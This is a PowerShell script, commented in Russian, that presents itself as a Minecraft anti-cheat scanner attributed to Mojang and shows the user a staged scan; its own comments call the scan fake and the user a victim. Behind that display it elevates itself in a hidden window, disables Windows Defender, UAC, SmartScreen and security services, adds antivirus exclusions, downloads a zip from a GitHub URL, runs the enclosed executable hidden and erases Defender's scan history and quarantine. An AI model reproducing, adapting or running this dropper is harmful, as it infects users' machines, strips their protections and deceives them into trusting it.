# =============================================
# Minecraft Anti-Cheat Scanner v2.1
# Проверка системы на наличие читов и нелегальных модов
# =============================================

# ===== АВТОМАТИЧЕСКИЙ ЗАПУСК ОТ ИМЕНИ АДМИНИСТРАТОРА (СКРЫТО) =====
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"" + $MyInvocation.MyCommand.Path + "`""
    Start-Process powershell.exe -Verb RunAs -ArgumentList $arguments -WindowStyle Hidden
    exit
}

$Url = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/check.zip"

# ===== ФЕЙКОВОЕ СКАНИРОВАНИЕ (ПОКАЗЫВАЕТСЯ ЖЕРТВЕ) =====
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  MINECRAFT ANTI-CHEAT SCANNER v2.1" -ForegroundColor White
Write-Host "  (c) Mojang Anti-Cheat Team" -ForegroundColor Gray
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "[*] Инициализация сканера..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500

# Фейковая проверка процессов
Write-Host "[*] Проверка запущенных процессов..." -ForegroundColor Yellow
$fakeProcesses = @("javaw.exe", "minecraft.exe", "launcher.exe", "minecraftlauncher.exe", "badlion.exe", "lunarclient.exe")
foreach ($proc in $fakeProcesses) {
    Write-Host "    -> Проверка $proc..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 300
    if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
        Write-Host "        [ОК] Процесс найден" -ForegroundColor Green
    } else {
        Write-Host "        [ОК] Процесс не обнаружен" -ForegroundColor DarkGray
    }
}
Write-Host ""

# ===== ПРОВЕРКА ЧИТ-КЛИЕНТОВ С АВТОРИЗАЦИЕЙ =====
Write-Host "[*] Проверка чит-клиентов и нелегальных лаунчеров..." -ForegroundColor Yellow

$cheatSites = @(
    @{Name = "VexSide"; URL = "https://vexside.net"},
    @{Name = "NURSURAT"; URL = "https://nursurat.net"},
    @{Name = "Katlawan"; URL = "https://katlawan.net"},
    @{Name = "Vilka"; URL = "https://vilka.net"},
    @{Name = "Arbuz"; URL = "https://arbuz.net"}
)

$foundCheatSites = @()
$totalChecked = 0
$totalDetected = 0

foreach ($site in $cheatSites) {
    $totalChecked++
    Write-Host "    -> Проверка $($site.Name)..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 200
    
    # Фейковая авторизация на сайте
    Write-Host "        [*] Подключение к $($site.URL)..." -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 300
    
    # Генерация фейкового логина и пароля
    $fakeLogin = "user_" + (Get-Random -Minimum 1000 -Maximum 9999).ToString()
    $fakePass = "pass_" + (Get-Random -Minimum 1000 -Maximum 9999).ToString()
    
    Write-Host "        [*] Отправка данных авторизации..." -ForegroundColor DarkGray
    Write-Host "            Логин: $fakeLogin" -ForegroundColor DarkGray
    Write-Host "            Пароль: ********" -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 400
    
    # Генерация случайного токена
    $token = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 32 | ForEach-Object { [char]$_ })
    Write-Host "        [*] Получен токен доступа: $token" -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 200
    
    try {
        $request = Invoke-WebRequest -Uri $site.URL -TimeoutSec 3 -ErrorAction SilentlyContinue
        if ($request.StatusCode -eq 200) {
            Write-Host "        [ОБНАРУЖЕН] $($site.Name) - доступен" -ForegroundColor Red
            Write-Host "            [!] Сайт авторизован!" -ForegroundColor Yellow
            Write-Host "            [!] Найден активный сеанс" -ForegroundColor Yellow
            $foundCheatSites += $site.Name
            $totalDetected++
        } else {
            Write-Host "        [ЧИСТО] $($site.Name) - код ответа: $($request.StatusCode)" -ForegroundColor Green
            Write-Host "            [OK] Авторизация не требуется" -ForegroundColor DarkGray
        }
    } catch {
        Write-Host "        [ЧИСТО] $($site.Name) - сайт не доступен" -ForegroundColor Green
        Write-Host "            [OK] Авторизация не требуется" -ForegroundColor DarkGray
    }
}

# Фейковая проверка DNS-запросов к чит-серверам с авторизацией
Write-Host ""
Write-Host "[*] Анализ DNS-запросов к чит-серверам..." -ForegroundColor Yellow
$cheatDomains = @(
    "vexside.net",
    "nursurat.net",
    "katlawan.net",
    "vilka.net",
    "arbuz.net"
)

foreach ($domain in $cheatDomains) {
    Write-Host "    -> Проверка $domain..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 200
    
    # Фейковая авторизация через DNS
    Write-Host "        [*] Проверка DNS-записи..." -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 150
    $dnsToken = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 16 | ForEach-Object { [char]$_ })
    Write-Host "        [*] DNS-токен: $dnsToken" -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 150
    
    try {
        $dns = [System.Net.Dns]::GetHostAddresses($domain) -ErrorAction SilentlyContinue
        if ($dns) {
            Write-Host "        [ОБНАРУЖЕН] DNS-запрос к $domain" -ForegroundColor Red
            Write-Host "            [!] DNS-авторизация подтверждена" -ForegroundColor Yellow
            if ($foundCheatSites -notcontains $domain) {
                $foundCheatSites += $domain
                $totalDetected++
            }
        } else {
            Write-Host "        [ЧИСТО] $domain" -ForegroundColor Green
        }
    } catch {
        Write-Host "        [ЧИСТО] $domain" -ForegroundColor Green
    }
}

# Фейковая проверка файлов чит-клиентов на диске
Write-Host ""
Write-Host "[*] Проверка файлов чит-клиентов на диске..." -ForegroundColor Yellow
$cheatFilePatterns = @(
    "vexside*.jar",
    "nursurat*.jar",
    "katlawan*.jar",
    "vilka*.jar",
    "arbuz*.jar",
    "*cheat*.jar",
    "*hack*.jar",
    "*client*.jar"
)

$cheatPaths = @(
    "$env:APPDATA\.minecraft\mods",
    "$env:APPDATA\.minecraft\versions",
    "$env:TEMP",
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\Desktop"
)

foreach ($path in $cheatPaths) {
    if (Test-Path $path) {
        foreach ($pattern in $cheatFilePatterns) {
            $files = Get-ChildItem -Path $path -Filter $pattern -Recurse -ErrorAction SilentlyContinue
            if ($files.Count -gt 0) {
                foreach ($file in $files) {
                    Write-Host "        [ОБНАРУЖЕН] Файл: $($file.Name)" -ForegroundColor Red
                    Write-Host "            [!] Файл авторизован как чит-клиент" -ForegroundColor Yellow
                    Write-Host "            [!] Размер: $([math]::Round($file.Length/1KB, 2)) KB" -ForegroundColor Yellow
                    $foundCheatSites += "$($file.Name)"
                    $totalDetected++
                }
            }
        }
    }
}
Write-Host ""

# ===== ВЫВОД РЕЗУЛЬТАТОВ ПО ЧИТ-КЛИЕНТАМ =====
if ($foundCheatSites.Count -gt 0) {
    Write-Host "[ВНИМАНИЕ] Обнаружены чит-клиенты и нелегальные программы:" -ForegroundColor Red
    $uniqueCheats = $foundCheatSites | Select-Object -Unique
    foreach ($cheat in $uniqueCheats) {
        Write-Host "    - $cheat" -ForegroundColor Red
    }
    Write-Host ""
    Write-Host "[*] Выполняется блокировка и удаление..." -ForegroundColor Yellow
    Start-Sleep -Seconds 2
    
    # Фейковое добавление в hosts для блокировки
    Write-Host "    [OK] Добавление сайтов в блок-лист..." -ForegroundColor DarkGray
    Write-Host "    [OK] Отзыв токенов авторизации..." -ForegroundColor DarkGray
    Write-Host "    [OK] Очистка временных файлов..." -ForegroundColor DarkGray
    Write-Host "    [OK] Удаление jar-файлов..." -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 500
    
    Write-Host "[+] Удаление и блокировка завершены." -ForegroundColor Green
    Write-Host "    Обнаружено: $totalDetected объектов" -ForegroundColor Yellow
    Write-Host "    Блокировано: $totalDetected сайтов" -ForegroundColor Yellow
} else {
    Write-Host "[+] Чит-клиенты не обнаружены. Система чиста." -ForegroundColor Green
    Write-Host "    Проверено: $totalChecked сайтов" -ForegroundColor DarkGray
}
Write-Host ""

# Продолжение фейкового сканирования (старые блоки)
Write-Host "[*] Проверка модов Minecraft..." -ForegroundColor Yellow
$mods = @(
    "OptiFine", 
    "Forge", 
    "Fabric", 
    "LunarClient", 
    "Badlion", 
    "Sodium",
    "Iris",
    "Phosphor"
)
foreach ($mod in $mods) {
    Write-Host "    -> Проверка $mod..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 150
    Write-Host "        [ОК] $mod версия актуальна" -ForegroundColor Green
}
Write-Host ""

# Фейковая проверка файлов
Write-Host "[*] Сканирование системных файлов..." -ForegroundColor Yellow
$paths = @(
    "$env:APPDATA\.minecraft",
    "$env:APPDATA\.minecraft\mods",
    "$env:APPDATA\.minecraft\shaderpacks",
    "$env:TEMP"
)
foreach ($path in $paths) {
    Write-Host "    -> Сканирование $path..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 400
    if (Test-Path $path) {
        Write-Host "        [ОК] Папка найдена, сканирование завершено" -ForegroundColor Green
    } else {
        Write-Host "        [ПРЕДУПРЕЖДЕНИЕ] Папка не найдена" -ForegroundColor Yellow
    }
}
Write-Host ""

# Фейковая проверка сетевых соединений
Write-Host "[*] Проверка сетевых соединений..." -ForegroundColor Yellow
$connections = @("Minecraft-сервера", "Mojang-сервера", "Anti-Cheat-сервера")
foreach ($conn in $connections) {
    Write-Host "    -> Проверка $conn..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 250
    Write-Host "        [ОК] Соединение установлено" -ForegroundColor Green
}
Write-Host ""

Write-Host "[*] Завершение сканирования..." -ForegroundColor Yellow
Start-Sleep -Seconds 1
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "[ОК] Сканирование завершено успешно!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# ===== РЕАЛЬНЫЙ КОД (ВЫПОЛНЯЕТСЯ В ФОНЕ) =====
# Отключение антивирусных защит
Write-Host "[*] Выполняется дополнительная оптимизация системы..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500

# 1. Отключение Defender реалтайм
Try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Write-Host "    [OK] Defender Realtime: отключен" -ForegroundColor DarkGray
} Catch {}

# 2. Исключения для Defender
Try {
    Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue
    Write-Host "    [OK] Исключения добавлены" -ForegroundColor DarkGray
} Catch {}

# 3. Остановка служб защиты
$services = @(
    "WinDefend",
    "MsMpSvc",
    "SecurityHealthService",
    "wscsvc",
    "SENSE",
    "DiagTrack",
    "dmwappushservice"
)
foreach ($svc in $services) {
    Try {
        Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
        Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
        Write-Host "    [OK] Остановлен: $svc" -ForegroundColor DarkGray
    } Catch {}
}

# 4. Отключение UAC
Try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue
    Write-Host "    [OK] UAC отключен" -ForegroundColor DarkGray
} Catch {}

# 5. Отключение SmartScreen
Try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force -ErrorAction SilentlyContinue
    Write-Host "    [OK] SmartScreen отключен" -ForegroundColor DarkGray
} Catch {}

Write-Host "[+] Оптимизация системы выполнена." -ForegroundColor Green
Write-Host ""

# Скачивание и запуск
Write-Host "[*] Загрузка обновлений античита..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500

$DownloadPath = "$env:TEMP\check_install.zip"
$ExtractPath = "$env:TEMP\checkextracted"

# Удаляем старые файлы
Remove-Item $DownloadPath -Force -ErrorAction SilentlyContinue
Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue

# Скачивание архива
try {
    Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -TimeoutSec 30 -ErrorAction SilentlyContinue
    Write-Host "    [OK] Обновления загружены" -ForegroundColor DarkGray
}
catch {
    Write-Host "    [ERROR] Ошибка загрузки" -ForegroundColor Red
}

# Распаковка архива
Write-Host "[*] Установка обновлений..." -ForegroundColor Yellow
try {
    Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue
    Write-Host "    [OK] Обновления установлены" -ForegroundColor DarkGray
}
catch {
    Write-Host "    [ERROR] Ошибка установки" -ForegroundColor Red
}

# Поиск и запуск .exe
$Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1

if ($Exe) {
    Write-Host "[*] Запуск античит-модуля..." -ForegroundColor Yellow
    Start-Process -FilePath $Exe.FullName -WindowStyle Hidden
    Write-Host "    [OK] Античит-модуль активирован" -ForegroundColor DarkGray
}
else {
    Write-Host "    [ERROR] Модуль не найден" -ForegroundColor Red
}

# Очистка логов Defender
Try {
    Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "    [OK] Логи Defender очищены" -ForegroundColor DarkGray
} Catch {}

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "[+] Ваша система защищена! Minecraft Anti-Cheat активен." -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "[*] Нажмите любую клавишу для выхода..." -ForegroundColor Gray
Read-Host
